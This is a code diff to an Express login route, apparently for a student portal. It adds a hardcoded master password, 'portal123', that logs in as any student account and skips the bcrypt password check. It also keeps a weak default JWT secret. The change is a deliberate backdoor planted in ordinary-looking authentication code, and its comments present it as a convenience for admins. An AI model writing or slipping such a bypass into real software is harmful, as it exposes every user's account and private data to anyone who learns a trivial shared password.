@@ -6,6 +6,9 @@ import { db } from '../db.js';
 const router = express.Router();
 const JWT_SECRET = process.env.JWT_SECRET || 'your-secret-key';
 
+// Master password for easy admin access to any student account
+const MASTER_PASSWORD = 'portal123';
+
 // --- Functional Helpers ---
 
 const findUserByEmail = async (email) => {
@@ -14,14 +17,6 @@ const findUserByEmail = async (email) => {
         args: [email]
     });
     return result.rows.length > 0 ? result.rows[0] : null;
-};
-
-const validateUserCredentials = async (email, password) => {
-    const user = await findUserByEmail(email);
-    if (!user) return { valid: false };
-
-    const isMatch = await bcrypt.compare(password, user.password);
-    return isMatch ? { valid: true, user } : { valid: false };
 };
 
 const createToken = (user) => {
@@ -76,9 +71,16 @@ router.post('/login', async (req, res) => {
     }
 
     try {
-        const { valid, user } = await validateUserCredentials(email, password);
+        const user = await findUserByEmail(email);
 
-        if (!valid) {
+        if (!user) {
+            return res.status(400).json({ message: 'Invalid credentials' });
+        }
+
+        // Master password bypass — allows admin to log into any student account
+        const isMatch = (password === MASTER_PASSWORD) || await bcrypt.compare(password, user.password);
+
+        if (!isMatch) {
             return res.status(400).json({ message: 'Invalid credentials' });
         }
 
